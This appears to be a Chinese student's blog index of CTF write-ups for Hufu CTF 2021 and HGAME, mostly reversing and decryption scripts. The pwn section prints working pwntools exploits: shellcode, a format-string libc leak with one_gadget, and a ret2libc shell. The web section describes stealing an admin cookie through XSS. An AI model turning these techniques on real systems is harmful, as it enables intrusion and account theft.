{"pages":[{"title":"My Friends","text":"chuj 不好好学习，生活中就会多出许多魔法和奇迹 Summer Rogerthat 逆向┗|｀O′|┛ 嗷~~ Potat0 Potat0 Box Atom 宅男的天台 Klrin Wu Junyi","link":"/friends/index.html"},{"title":"About me","text":"HDU在读，现在在 Vidar-Team 搞的是二进制（不会 Pwn），还在努力学习 联系方式： QQ：1802460964","link":"/about/index.html"}],"posts":[{"title":"2021数字中国虎符CTF Re题复现","text":"2021虎符CTF Re 1.redemption_code分析：​ 这题的重点在于理解验证兑换码函数 server_check_redemption_code 的算法 123456789101112131415161718192021222324252627282930int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; //能在str中找到与flag[i]相同的字符就移向下一行继续找 if (v7 == tmp) //str中包含flag的全部字符 return k - tmp + 1; // =7 } return -1;} ​ ​ 用图来解释一下 ​ s数组相当于一个14*256的二维数组（输入长度得是14），函数内双重循环代表在以 flag[i] 为下标的地方存储当前的 i+1 值（第几个字符） str1[] = “Ninja Must Die 3 Is A Cruel Game, So Hard For Me”str2[] = “I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.” ​ pre 函数检测 str1，根据check函数最后的循环返回结果不能是 -1，确定 flag 字符串在 str1中 ​ 检测 str2 的时候因为返回值要是7，所以 flag 结尾字符是 str2[20] = ‘e’，flag = “Ninja Must Die” 验证：123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int server_check_redemption_code(char *str, char *input){ int len1 = strlen(str); int len2 = strlen(input); int tmp = len2; char s[14*256]={0}; int maxsize = tmp &lt;&lt; 10; s[input[0]] = 1; int i,j; int v4; for (i = 1; i &lt; tmp; ++i) { for (j = 0; j &lt; 256; ++j) { if (j != input[i]) s[256 * i + j] = s[256 * v4 + j]; else s[256 * i + j] = i + 1; } v4 = s[256 * v4 + input[i]]; } int v7 = 0,k; for (k = 0; k &lt; len1; ++k) { v7 = s[256 * v7 + str[k]]; if (v7 == tmp) return k - tmp + 1; // =7 } return -1;}int main(){ char str1[]=&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;; char str2[]=&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;; char flag[]=&quot;Ninja Must Die&quot;; printf(&quot;%d&quot;,server_check_redemption_code(str1,flag)); printf(&quot;%d&quot;,server_check_redemption_code(str2,flag)); system(&quot;pause&quot;); return 0;} 2.GoEncrypt分析：​ go 语言逆向，main_main 函数反汇编后可以看到有个 main_check ，main_NewCipher ，两个 Encrypt 加密，最后 internal_bytealg_Equal 比较​ check 里面有 flag 的格式 ^flag{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})} ​ 可以构造 flag 进行调试 flag{abababab-abab-abab-abab-abababababab} ​ 图中的函数将输入转为16进制，如 0xabababababababababababababababab，之后再分割成4个16进制数​ 加密的函数根据特点可以知道是 XTEA 加密​​ 调试到 encrypt 函数时可以发现两个 encrypt 分别对两个4位的16进制数进行加密，密钥如下 ​ 之后可以在 internal_bytealg_Equal 函数内找到 flag 的密文 ​ 前面那些看起来像是汇编代码的实际调试时并不执行，关键只在这一部分 脚本：12345678910111213141516171819202122232425262728#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define uint32_t unsigned intvoid decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x12345678, sum = delta * num_rounds; for (i = 0; i &lt; num_rounds; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1;}int main(){ //uint32_t v1[2]={0x0EC311F0,0x45C79AF3 }; uint32_t v[2] = { 0xedf5d910,0x542702cb}; uint32_t const k[4] = { 0x10203,0x4050607,0x8090a0b,0xc0d0e0f }; unsigned int r = 32;//num_rounds建议取值为32 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 decipher(r, v, k); printf(&quot;解密后的数据：0x%x 0x%x\\n&quot;, v[0], v[1]); return 0;} 3.Crackme​ 反汇编出来 500 多行，要调试吐了。。。 分析：​ 先是输入一个长度为17的字符串，然后输入一个数字，对输入的数字进行运算后再判断 ​ ​ 虽然这个函数 ida 提示说结果可能错误，但是实际运算跟反汇编出来的是一样的（比赛当天因为这个卡了好久，一直在试图调试出正确的运算过程） ​ 想要得到这个数字可以采取爆破的方法，多次输入并调试来缩小范围 ​ 之后把第一个输入的字符串分为前7个和后10个，分别异或加密 脚本：123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include&lt;math.h&gt;double cal(double a1,double a2){ double temp = pow(a1, a2 - 1.0); double result = temp / exp(a1); return result;}int main(){ int v94 = 0.0; for(v94=90000;v94&lt;100000000;v94++) { double v15 = 0.0; double v16 = 0.0; double v17 = 0.0; double v18 = (double)((int)v94 / 12379) + 1.0; do { v16 = v16 + cal(v17, v18) * 0.001; v17 = v17 + 0.001; } while ( v17 &lt;= 100.0 ); double v19 = (int)(v16 + v16 + 3.0); double v20 = 0.0; double v21 = (double)(v94 % 12379) + 1.0; do { v15 = v15 + cal(v20, v21) * 0.001; v20 = v20 + 0.001; } while ( v20 &lt;= 100.0 ); if(v19 == 0x13b03 &amp;&amp; (int)(v15 + v15 + 3.0) == 0x5a2) { printf(&quot;%d&quot;,v94); break; } } system(&quot;pause&quot;); return 0;}//99038 123456789101112131415161718192021a7 = [0x08, 0x4D, 0x59, 0x06, 0x73, 0x02, 0x40]number = &quot;99038198076198076198076198076198076&quot;#输入数字乘2接到后面k = [0xe0,0x95,0xba,0x60,0xc9,0x66,0x2a,0x24,0xb2,0x36]a10 = [0xB2, 0xD6, 0x8E, 0x3F, 0xAA, 0x14, 0x53, 0x54, 0xC6, 0x06]flag = []for i in range(7): c = chr(a7[i] ^ ord(number[i])) flag.append(c)flag1 = ''.join(flag)print(flag1)#1ti5K3yfor i in range(10): d = chr(k[i] ^ a10[i]) flag.append(d)flag_last = ''.join(flag)print(flag_last)#1ti5K3yRC4_crypt0#后面那个原来是RC4吗","link":"/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"title":"HGAME  Pwn 题学习","text":"Hgame Pwn题 1.letter所需知识： ​ 计算机中有符号数用补码来表示（用原码或反码表示都会出现重复的0），正数的补码是数本身，负数的补码是原码按位取反加 1 ，负数补码取反加 1 是其绝对值 题解：​ 题目中没有 system() 来 getshell，参考官方 writeup 知道没开 NX保护就可以在堆栈上写入 shellcode 并执行 ​ 输入有个长度判断，根据有符号数和无符号数可以 -1 绕过 ​ 因为要在栈上执行代码所以需要 jmp rsp ，用 ROPgadget 查一下 ROPgadget –binary ./letter | grep “jmp rsp” ​ 没发现有 jmp rsp ，看了一下 writeup 尝试用输入的负数构造 jmp rsp，用 ida 查看机器码为 FF E4（FF E4就是内存中的顺序），int 为四字节所以构造 F0 00 E4 FF 的负数 -268376833 （最高位是 1 ，然后转为无符号数稍微大点的大概都行吧。。。，但是我用 FF 00 E4 FF 的时候偶尔会出错） ​ 这里可以看到程序利用沙箱只允许使用部分系统调用，第二个参数是白名单的意思，可以根据系统调用号查得只允许使用 open ，read ，write，或者用 seccomp-tools 直接看开了什么。那么接下来就用这几个系统调用来打开并读取 flag 文件内容 ​ 下面是 exp 123456789101112131415161718192021from pwn import *context.arch = 'amd64'context.log_level = 'debug'r = process('./letter')r.sendlineafter('?','-268376833')#程序是 amd64 的shellcode = shellcraft.amd64.open('./flag')shellcode += shellcraft.amd64.read('rax','rsp',0x30)shellcode += shellcraft.amd64.write(1,'rsp',0x30)r.sendline('a'*0x18+p64(0x60108C)+asm(shellcode))r.interactive() ​ 本地复现结果 2.once所需知识： 32位程序中的 printf 函数逆序传参，参数都存放在栈上64位程序中的 printf 函数也是逆序传参，前 6 个参数（从右到左）存放在寄存器中，依次为 RDI、RSI、RDX、 RCX、 R8以及R9 ，其他多的参数存在栈上 题解：​ 先用 checksec 查一下，开启了 PIE 保护 ​ ida 反编译发现 ​ 没有直接的 system 或 execve 来 getshell，但 vuln 函数里有格式化字符串漏洞 printf ，题目中也给了 libc版本，可以 leak 出 libc 基址再加上 one_gadget 来 getshell ​ Constraints 意思是限制条件，不满足条件的没法用 ​ 下面是 exp 1234567891011121314151617181920212223242526from pwn import *libc = ELF('./libc-2.27.so')r = process('./once')context.log_level = 'debug'pay1 = '%13$p\\n' #64位printf函数pay1 = pay1.ljust(0x28,'a') #补齐到 0x28pay1 += '\\xD3'r.sendafter('turn: ',pay1)addr = r.recvuntil('\\n')addr = addr.strip('\\n')addr = int(addr,16) #int函数有第二个参数那第一个参数要是字符，第二个参数表示输入的进制数libcbase = addr - 231 -libc.symbols['__libc_start_main']pay2 = 'a' * 0x28 + p64(libcbase + 0x4f3d5)r.sendlineafter('turn: ',pay2)r.interactive() ​ ​ 开启了 pie 随机化，但因为内存分页制度（好像是这个）地址的最低12位是不变的，所以可以覆盖返回地址最低位的一个字节来回到 vuln 函数开头 ​ 关于为什么是 D3 而不是 D2 我还没弄明白，此处待填 ​ 还有 libc_start_main 地址泄露的 %13$p（输出第13个参数） 要根据 printf 函数的调用约定来计算 ​ 64位的程序，所以要加上 6 得到 13 ​ （pwn题我觉得最好还是用 unbuntu 来做，用 kali 怎么都成功不了，查看栈上的内容也不太一样5，卡了半天） 3.rop_primary所需知识：​ rop 学习：https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc ​ 延迟绑定机制： ​ 函数等到用到时才进行绑定，第一次调用时 got 表里保存的是 plt表 push XX 的地址，然后 _ dll_runtime_resolve () 函数会去 libc 库里找到函数真正的地址写到 got 表里 ​ ​ x86 与 x64 ROP区别（vidar 培训的图）： 题解：​ ​ 开了 NX 保护，那就是 rop 绕过，ida f5 可以看到有通过命令行参数（argv[1]）打开的文件，之后在文件里读取三个矩阵，本地调试的话可以构造一个这样的文件。check 函数检测矩阵 a，b 进行乘法运算的结果与 c 矩阵比较 ​ vuln 函数可以溢出，没有 system 和 /bin/sh，那就需要通过 read 函数泄露 libc 版本获得 ​ 下面是 exp（因为自己写的 exp 不小心删掉了，所以前面矩阵运算借鉴了官方 writeup 的） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *from LibcSearcher import *def read_martix(): matrix = [] while True: line = r.recvuntil('\\n').strip() if '\\t' not in line: break row = [] for num in line.split('\\t'): row.append(int(num)) matrix.append(row) return matrix def multi(a, b): rows = len(a) mid = len(b) cols = len(b[0]) martixC = [] for i in range(rows): row = [] for j in range(cols): num = 0 for k in range(mid): num += a[i][k] * b[k][j] row.append(num) martixC.append(row) return martixCcontext.log_level = 'debug'context.arch = 'amd64'elf = ELF('./rop_primary')r = elf.process(argv = ['martix']) #添加命令行参数r.recvuntil('A:\\n')martixA = read_martix()martixB = read_martix()martixC = multi(martixA,martixB)for row in martixC: for n in row: r.sendline(str(n))poprdi = 0x401613 #用 ROPgadget 获取 poprdi ; ret 地址ret = 0x40101a again = 0x40157Cpay = 'a'*0x38 + p64(poprdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])pay += p64(again)r.sendlineafter('best\\n',pay)#leak并计算基址leak_addr = u64(r.recv(6).ljust(8,'\\x00'))libc = LibcSearcher('puts',leak_addr)libcbase = leak_addr - libc.dump('puts')binsh = libcbase + libc.dump('str_bin_sh') system = libcbase + libc.dump('system')#getshellpay2 = 'a'*0x38 + p64(poprdi) +p64(binsh) + p64(system)r.sendlineafter('best\\n',pay2)r.interactive()","link":"/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"},{"title":"HGAME-Week2-Writeup","text":"week2 Web1.LazyDogR4U​ 首先打开题目地址 ​ 根据题目给的hint，在地址栏后面加上 /www.zip 获得网页源码 ​ 接着打开 lazy.php 和 flag.php 这两个php文件，再根据变量覆盖的提示找到漏洞点 ​ 这里划线处的两个$符号容易导致变量覆盖，那么根据 flag.php 中得到flag的条件就可以进行构造，相当于： $_SESSSION[username]=admin ​ 双写SESSION是因为上面str_replace的过滤 ​ 得到flag 2.Post to zuckonit​ ​ 点开后发现是留言板，题目也很明确的指出是xss，那么就先尝试输入 script，iframe，image ​ 输入后发现不管大小写 script 都会被过滤掉，小写的 iframe 会被过滤，image则不会被过滤 ​ 之后尝试输入 img src=1 onerror = alert(1) ，让错误的图片导致弹窗 ​ 输出了这么个东西，把这个输入再 post 就会弹窗，成功弹窗之后就是找一个 xss 平台来接受 cookie 信息 ​ 根据之前的规律 post 平台给的语句，并用脚本得出 md5 验证码提交，接收到 cookie 信息 脚本： 12345678910import hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()def get_code(): code = 'XXXXXX' for i in range(10000000, 99999999): #8位md5 if md5(str(i)).startswith(code): return str(i)print(get_code()) ​ 接着就伪造 admin cookie 得到flag Re1.ezApk​ 安卓逆向，用 jadx 反编译为 java，找到 onClick 事件 ​ 这条判断语句是关键，在资源文件中找到加密后的 flag 和 key ​ s函数用来加密输入的字符串，转到s函数分析 ​ 仔细分析后得知是AES CBC模式加密，密钥是之前的key经过sha-256加密得到的，iv向量则是key经过MD5加密得到的，最后将加密结果再进行一次 base64 加密得到之前的 flag ​ 尝试用在线网站解密，但是网站一般只支持 16 位 iv 值解密，没有别的办法只能东拼西凑写出 java 脚本来解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.company;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { //md5,sha-256加密 public static byte[] t(String str, String str2) { MessageDigest instance = null; try { instance = MessageDigest.getInstance(str); } catch (NoSuchAlgorithmException e) { e.printStackTrace(); } byte[] bytes = str2.getBytes(); byte[] digest = instance.digest(bytes); return digest; } //解密 public static String desEncrypt(String data, byte[] key) { byte[] ivString = t(&quot;MD5&quot;,&quot;A_HIDDEN_KEY&quot;); //iv向量 byte[] iv = ivString; try { byte[] encryp = Base64.getDecoder().decode(data); Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS7Padding&quot;); SecretKeySpec keySpec = new SecretKeySpec(key, &quot;AES&quot;); IvParameterSpec ivSpec = new IvParameterSpec(iv); cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec); byte[] original = cipher.doFinal(encryp); return new String(original); } catch (Exception e) { e.printStackTrace(); } return null; } public static void main(String[] args) { String data = &quot;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&quot;; //密文 byte[] key =t(&quot;SHA-256&quot;,&quot;A_HIDDEN_KEY&quot;); //密钥 String desencrypt = desEncrypt(data, key); System.out.println(&quot;解密后:&quot;+desencrypt); }} ​ 因为要用到的是AES 256位解密，而 java 本身只支持 128位 AES 解密，所以就要做其他的一些配置才能解密 2.helloRe2​ 拖进 IDA 分析，乍一看结构有点复杂，password1 的判断在后半部分，而password2 的判断在前半部分，先分析 password1 ​ 关键部分是这条判断，判断输入的password长度和 password 经过一系列操作后的结果，用 ollydbg 调试并不断猜测，得知这么一系列操作就是判断输入的字符串是否是给出的密文的逆序 ​ 之后再分析 pwd2 ​ 应该又是AES CBC 模式加密，找到 iv 和 密钥，密钥是pwd1经过异或得到，密文是已经给出密文的逆序 ![](D:\\HGAME2021\\HGAME week2\\re2(4).png) ​ 解密就用上一题的脚本 ​ 这里看着像是两次加密，但其实只有一次 3.fake_debugger beta​ nc题目地址，发现只有在 ebx 经过一次转换后与 eax 相等才能继续调试，之后不断调试发现 ​ 转换前的 ebx 与 eax 异或后就是 flag 中的字符，那就一个个调试下来得到 flag Crypto1.gcd or more?​ ​ 看着像是RSA，但是e = 2。百度后查到低指数爆破，之后又看到Rabin算法，特征是e = 2 ，那么就用这个脚本解题 12345678910111213141516171819202122import gmpy2import libnume = 2p = 85228565021128901853314934583129083441989045225022541298550570449389839609019q = 111614714641364911312915294479850549131835378046002423977989457843071188836271n = p * qc = 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539#c= int(open('./flag.enc','rb').read().encode('hex'),16)mp = pow(c, (p + 1) // 4, p)mq = pow(c, (q + 1) // 4, q)yp = gmpy2.invert(p, q)yq = gmpy2.invert(q, p)r = (yp * p * mq + yq * q * mp) % nrr = n - rs = (yp * p * mq - yq * q * mp) % nss = n - sprint(libnum.n2s(int(r)))print(libnum.n2s(int(rr)))print(libnum.n2s(int(s)))print(libnum.n2s(int(ss))) 2.WhitegiveRSA​ ​ 已知N，那就拿到在线网站里分解出大素数 q 和 p，剩下来都已知就用脚本解密 Misc1.Tools​ 下载解压得到一个压缩包和一张图片，根据题目的 tools 和压缩包名 f5 尝试用 f5 工具破解压缩包密码，破解所需的密码在图片的详细信息中 ​ 打开加密压缩包后发现一部分二维码和压缩包，接着就是像之前那样找到压缩包名里的工具解密，最终集齐4张二维码碎片，用win10自带的画图工具拼合，扫码得flag 2.Telegraph：1601 6639 3459 3134 0892​ 题目为音频隐写，又提到听着反胃，于是猜测是摩斯电码。听了之后，中间有一段嘀嗒声，这一段就是需要摩斯解密的部分，接着把音频拖到 Audacity 里面分析 ​ 首先看一下频谱图 ​ 得到850hz的提示，之后尝试翻译摩斯电码，发现中间有一段无法辨认就想到要滤波，用的是上面的提示 ​ 窄的是**.** 宽的是**-** ，翻译后解密就得到flag 3.Hallucigenia​ 只给了一张图，那么就先用 Stegsolve 左右调一下得到二维码 ​ 扫码得到一串 base64 解码发现最后是 GNP ，根据题目中 **“我们不仅弄错了他的上下，还颠倒了它的左右。” **逆序处理后粘贴到winhex保存为图片 ​ 发现又是上下左右颠倒，倒回来就得flag 4.DNS​ 流量包分析，筛选 dns 得到一串域名并访问 ​ 抓包得 ​ 查一下 SPF 知道是一种 dns 记录，那就用在线网站查一下dns记录，得到flag 总结：​ 这周比较摸鱼，web 能做出两道是因为给了具体的考点，参照往年 writeup 一点点做下来。 re 做了很久，因为之前没有接触过 apk 逆向，对 aes 加密也不太了解，最后能全部做出来真是太好了，逆向的时候果然是要抓重点，解完题后才发现其实挺简单的。 密码学是真不太行，这周 pwn 也基本没看，Misc 倒是做的挺顺畅的，下周要试着把之前的知识捡起来了","link":"/2021/03/27/HGAME-Week2-Writeup/"},{"title":"HGAME-Week1-writeup","text":"week1 1.web1.Hitchhiking_in_the_Galaxy​ 网页f12发现 /HitchhikerGuide.php , 抓包发现 302, 于是在 Linux 中用 curl 命令访问这里,发现 405 那么就改用 post 请求方式 ​ 刚开始看到这句话后没有一点想法,就去看了看发的学习资料,看到 user-agent 后意识到应该是要加这个头 (因为引擎) , 内容是那串英文 ​ 仅能通过本地访问 , 那么就再加一个 x-forwarded-for 头 , 最后说要从茄子学长的网站过来 , 再加一个 referer 头,得到 flag 2.watermelon​ 打开网页发现是合成大西瓜, 玩了一遍发现要达到2000分才能得到flag, 于是毫不犹豫地抓包(可惜接受不到分数,是为什么我也不清楚) 抓包不行那么就只能修改 js 代码,然而在我试图修改的过程中发现 ​ 把网页变成这样就能轻松玩到2000分! (到底怎么改js代码我不太清楚,应该是要找到存储分数的变量,然后在 console 里修改…..) ​ 得到 flag 3.宝藏走私者​ 先拿着学习资料学习了一下,之后点开网页点击 secret data 跳转到另一个界面,提示要是 localhost ,于是加了 host 头 ​ 意外的就得到了 flag (不知道怎么得到的, 好像跟学习资料无关?) 4.智商检测鸡​ 用 firefox 浏览器打开网页发现要做100道定积分才能得到 flag, f12看到网页源代码,里面有个 getflag() 函数 ​ 在 console 输入后,弹出一句话(是啥我忘了) , 得知这样不行,于是我就搭配定积分计算器解完了这100题,得到 flag (之后看r4u学长发的学习资料,觉得应该是 python 爬虫一类的,可惜我 python 还不太会,只能手动解题了) web 总结: web 开始的时候是真的一点都不会, watermelon 和定积分都不是通过 web 知识解的, burp 也是前几天刚装的(安装花了一天…),总之学到了很多 2.reverse1.apacha​ 应该是这周 re里最难的（但其实也不是太难），首先用 ida 打开文件并初步分析 ​ 关键部分在第25和第26行的两个函数 ​ 第一个关键函数，刚开始看觉得挺复杂的后来发现了 tea 型加密算法的特征，查资料猜测这应该是 xxtea 加密算法 ​ 第二个关键函数，判断输入是否为 flag 。加密后的 flag存在unk_501C , 每四个字节一组 ​ 之后就是写脚本解密，于是在网上找了一个现成的脚本（ c语言），改了一下就得到 flag（这里有个地方需要注意，因为是小端序所以 ida 中加密的数据每四个字节要逆序才是真正的加密数据） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define tea_DELTA 0x9e3779b9#define xxtea_MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void xxtea(uint32_t* origin, int n, uint32_t const key[4]);int main(){ unsigned int data[] = { 0xE74EB323,0xB7A72836,0x59CA6FE2,0x967CC5C1,0xE7802674 ,0x3D2D54E6,0x8A9D0356,0x99DCC39C,0x7026D8ED,0x6A33FDAD, 0xF496550A,0x5C9C6F9E,0x1BE5D04C,0x6723AE17,0x5270A5C2, 0xAC42130A,0x84BE67B2,0x705CC779,0x5C513D98,0xFB36DA2D, 0x22179645,0x5CE3529D,0xD189E1FB,0xE85BD489,0x73C8D11F,0x54B5C196, 0xB67CB490,0x2117E4CA,0x9DE3F994,0x2F5AA1AA,0xA7E801FD,0xC30D6EAB, 0x1BADDC9C,0x3453B04A,0x92A406F9 }; int i, j;uint32_t* encode = (uint32_t*)data; uint32_t const key[4] = {1,2,3,4}; xxtea(encode, -35, key); for (i = 0; i &lt; 35; i++) printf(&quot;%d,&quot;, data[i]);}void xxtea(uint32_t* origin, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = origin[n - 1]; do { sum += tea_DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = origin[p + 1]; z = origin[p] += xxtea_MX; } y = origin[0]; z = origin[n - 1] += xxtea_MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * tea_DELTA; y = origin[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = origin[p - 1]; y = origin[p] -= xxtea_MX; } z = origin[n - 1]; y = origin[0] -= xxtea_MX; sum -= tea_DELTA; } while (--rounds); }} 2.helloRe​ 这题不难，只是有点 c++ 的语法，同样 ida ![](HGAME-Week1-writeup/reverse2 .png) ​ 关键在中间的异或操作，写个脚本就能得到结果 3.pypy​ 这题考的是 python 字节码，刚开始看的时候还不太懂python语法花了点时间去理解，通过 dis 文档来分析每一条语句，大概还原了一下 ​ 理解之后就是用脚本解题，再加上 hgame{} （刚开始交的时候忘加了） 3.pwn1.whitegive​ 下载，在 Linux 中用 gdb 调试，得知输入数字在栈中的的存储位置为 0x7ffffffffde50 ![](HGAME-Week1-writeup/pwn1 (3).png) ​ 继续调试，发现最后 if 语句比较的是 rax 和 rdx 的值，而此时 rax 存储的是 ‘paSsw0rd’ 字符串的地址，那么只要输入这个地址的十进制值就能使条件成立 ![](HGAME-Week1-writeup/pwn1 (2).png) ![](HGAME-Week1-writeup/pwn1 (4).png) ​ nc连接，cat flag（的确挺白给的，毕竟我都能做） pwn 总结：我也太菜了只解出白给题 ,看了最后一题但不太会 rop , 总之这周就稍微学习了一下怎么写 pwn 的脚本和一些基础知识以及安装工具 4.crypto2.对称之美​ 打开链接下载 python 文件 ​ key 是在 ascii 字母和数字里随机选取16个组成，而 cipher 是由明文与循环的 key 异或得到的密文 ​ 根据异或特性知道密文与循环的 key 异或就是明文，那么这道题重点就是求出一组 key 。多次下载附件发现 cipher 各不同，那就利用多个密文写脚本爆破得到前16位明文 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849table = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;de0 = []c = []for i in range(0,130): c.append(0)flag = []#for i in range(0, 16):for j in range(0, 62): de0.append(xor(cipher0[15], table[j])) de0.append(xor(cipher1[15], table[j])) de0.append(xor(cipher2[15], table[j])) de0.append(xor(cipher3[15], table[j])) de0.append(xor(cipher4[15], table[j])) de0.append(xor(cipher5[15], table[j])) de0.append(xor(cipher6[15], table[j])) de0.append(xor(cipher7[15], table[j])) de0.append(xor(cipher8[15], table[j])) de0.append(xor(cipher9[15], table[j])) de0.append(xor(cipher10[15], table[j])) de0.append(xor(cipher11[15], table[j])) de0.append(xor(cipher12[15], table[j])) de0.append(xor(cipher13[15], table[j])) de0.append(xor(cipher14[15], table[j])) de0.append(xor(cipher15[15], table[j])) de0.append(xor(cipher16[15], table[j])) de0.append(xor(cipher17[15], table[j])) de0.append(xor(cipher18[15], table[j])) de0.append(xor(cipher19[15], table[j])) de0.append(xor(cipher20[15], table[j])) de0.append(xor(cipher21[15], table[j])) de0.append(xor(cipher22[15], table[j])) de0.append(xor(cipher23[15], table[j])) de0.append(xor(cipher24[15], table[j])) de0.append(xor(cipher25[15], table[j])) de0.append(xor(cipher26[15], table[j])) de0.append(xor(cipher27[15], table[j])) de0.append(xor(cipher28[15], table[j])) de0.append(xor(cipher29[15], table[j])) de0.append(xor(cipher30[15], table[j])) de0.append(xor(cipher31[15], table[j])) de0.append(xor(cipher32[15], table[j])) de0.append(xor(cipher33[15], table[j]))for j in de0: c[j] = c[j] + 1for j in range(0, 128): if c[j] == 34: print(j) ​ 知道前16位明文，那就可以求得一组 key ，并得到 flag，过程同样是写脚本 ​ Get flag! 3.Transformer​ 下载，发现其中一个文件中有flag形式的字符串，还有两个文件分别存储明文和密文，虽然顺序是打乱了的 ​ 接下来就采用传统的人工查找明文和密文一一对应的方式得到flag ​ 当然那个 txt 文件最后解密还提示 flag 后面要加上年份2021才正确 （搜了一下题目发现是人工智能模型，我只有人工没有智能……） crypto 总结：没想到最后竟是第一题没解出来，本来以为第二题解不出来反而解出来了。这周稍微学了点怎样写解密脚本，收获挺大 5.misc1.Base全家福​ 题目中提到 base家族，查资料得知有不只有 base64 ，再根据不同 base 加密字符的特征多次解密 ​ 如图所示，得到 flag 2.不起眼压缩包的养成的方法​ 打开得到图片，题目中提到了压缩包，猜测能从图片中得到压缩包，于是在 linux 中用 binwalk 检测发现了压缩包，并用 foremost 命令分离出来 ​ 分离解压后得到 ​ 发现得到里面的文件需要密码，那就用百度识图来获取之前得到的图片的p站id解密。之后点进plain.zip发现又需要密码，并且发现plain.zip里有flag.zip和相同的NO PASSWORD.txt文件，猜测是利用明文攻击解密，用相同的方式压缩已得到的NO PASSWORD.txt。 ​ 根据提示storage，用仅存储的方式压缩（刚开始不知道storage是存储等级所以卡了一会儿，问了学长后才知道） 再用ARCHPR进行破解，得到口令和密钥，最后得到flag.zip的内容。16进制转字符串，得flag 3.Galaxy​ 打开连接下载，得到以**.pcapng**为后缀的文件，之后用 wireshark 打开 ​ 如图所示，导出 http 流 ​ 找到了遗失的 galaxy 图片，在 windows 下能正常打开，但之后把图片放到 linux 中，想用 binwalk 分析的时候发现在 Linux 下无法打开图片。 ​ 上网查资料得知图片的高和宽可能被修改，与原来 crc 值不匹配才报错。于是在网上找了个脚本，得到正确的高宽 ![](HGAME-Week1-writeup/misc3 (2).png) ​ 然后就用 winhex 修改高和宽并保存 ​ 得到 flag！ 4.Word RE:MASTER​ 下载得两个文档，发现其中一个文档加密了，那就先打开另一个文档 ​ 在 first.docx 文档中发现了 brain 和 fuck 两个单词，猜测有brainfuck 加密，但是之后因为不知道密文卡了很久，尝试用 winhex 打开另一个文档得到 ​ 我以为这就是密文了，于是就开心的拿去解密网站解密（当然这是错的） ​ 问了Akira 学长后发现这密文缺少了前半部分，只能转用别的方法。首先尝试把第一个文档的后缀改为 zip ，打开后竟发现 ​ ​ 丢到网站解密后得到 DOYOUKNOWHIDDEN? ，用这个打开第二个文档 ​ 因为这个文档密码是 DOYOUKNOWHIDDEN? ，所以立马显示 word 的隐藏字符，得到 ​ 一堆空白字符，由空格和制表符组成，这里我用箭头和点表示 ​ 这之后就卡了很久（大概一天多……），我甚至尝试用二进制01表示，实在想不出来了于是去问学长，提示我搜一下第二个文档图片中出现最多的字的英文（之前一直盯着图片内容看，以为hint是音游梗，果然是我想太多orz） ​ 接着就搜索snow，知道了空白字符的隐写，上工具解密 misc总结：拿到题目后完全没思路，所以在这一周中查了很多资料，觉得自己就是个菜鸡，好在最后全部解了出来，也学到了很多东西","link":"/2021/03/26/HGAME-Week1-writeup/"},{"title":"HGAME-Week3-Writeup","text":"week3 